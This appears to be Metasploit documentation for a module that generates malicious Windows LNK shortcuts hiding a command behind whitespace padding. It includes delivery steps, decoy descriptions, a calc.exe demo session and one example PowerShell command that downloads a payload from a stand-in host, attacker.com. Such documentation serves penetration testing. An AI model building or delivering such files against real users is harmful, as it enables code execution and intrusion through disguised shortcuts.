## Vulnerable Application

Windows systems where LNK files are processed, such as in Explorer or when shortcuts are executed.
This can lead to arbitrary command execution via manipulated command line buffers.

References:
- [ZDI-CAN-25373](https://www.zerodayinitiative.com/advisories/ZDI-CAN-25373/)
- [Windows LNK Research](https://zeifan.my/Windows-LNK/)
- [Gist Example](https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1)
- [Trend Micro Analysis](https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html)

Disclosure Date: 2025-07-19.

## Verification Steps

1. Start msfconsole.
1. Load the module: `use auxiliary/fileformat/windows_lnk_padding`.
1. Optionally customize FILENAME, DESCRIPTION, ICON_PATH, or BUFFER_SIZE.
1. Execute the module: `run`.
1. A malicious LNK file will be generated.
1. Deliver the LNK file to the target Windows system.
1. Open the LNK file to trigger command execution (e.g., launching calc.exe).

## Options


### COMMAND

The command to execute when the LNK is opened.

Default: `C:\\Windows\\System32\\calc.exe`

Example:
```
set COMMAND powershell.exe -c "Invoke-WebRequest -Uri http://attacker.com/payload"
```

### DESCRIPTION

Optional description for the LNK file. If not set, a random sentence is generated.

Example:
```
set DESCRIPTION Important Document
```

### ICON_PATH

Optional path to an icon for the LNK file. If not set, a random system icon path is generated.

Example:
```
set ICON_PATH %SystemRoot%\\System32\\shell32.dll
```

### BUFFER_SIZE

The size of the whitespace padding buffer before the command (must be sufficient to avoid truncation).

Default: 900

Example:
```
set BUFFER_SIZE 1000
```

## Scenarios

### Basic Command Execution on Windows

Target: Any Windows system (e.g., Windows 10 or later).

Generate an LNK that launches Calculator with custom padding:

```
msf > use auxiliary/fileformat/windows_lnk_padding
msf auxiliary(fileformat/windows_lnk_padding) > set FILENAME calc.lnk
FILENAME => calc.lnk
msf auxiliary(fileformat/windows_lnk_padding) > set COMMAND C:\\Windows\\System32\\calc.exe
COMMAND => C:\\Windows\\System32\\calc.exe
msf auxiliary(fileformat/windows_lnk_padding) > set BUFFER_SIZE 900
BUFFER_SIZE => 900
msf auxiliary(fileformat/windows_lnk_padding) > set DESCRIPTION Calculator Shortcut
DESCRIPTION => Calculator Shortcut
msf auxiliary(fileformat/windows_lnk_padding) > set ICON_PATH %SystemRoot%\\System32\\calc.exe
ICON_PATH => %SystemRoot%\\System32\\calc.exe
msf auxiliary(fileformat/windows_lnk_padding) > run

[*] Generating LNK file: calc.lnk
[+] Successfully created calc.lnk
[*] Command line buffer size: 900 bytes
[*] Target command: C:\\Windows\\System32\\calc.exe
[*] Auxiliary module execution completed
```
